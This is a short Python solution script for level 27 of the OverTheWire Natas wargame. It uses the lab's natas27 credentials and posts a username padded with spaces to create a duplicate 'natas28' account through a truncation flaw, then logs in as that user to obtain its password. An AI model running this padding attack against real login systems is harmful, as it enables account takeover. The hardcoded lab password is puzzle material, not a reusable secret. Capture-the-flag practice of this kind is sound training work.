#!/usr/bin/env python

import requests
import re

username = 'natas27'
password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
# response = session.get(url, auth=(username, password))
response = session.post(url, data={
                        'username': 'natas28' + ' '*58 + 'anything', 'password': 'anything'}, auth=(username, password))
response = session.post(url, data={
                        'username': 'natas28', 'password': 'anything'}, auth=(username, password))
content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)
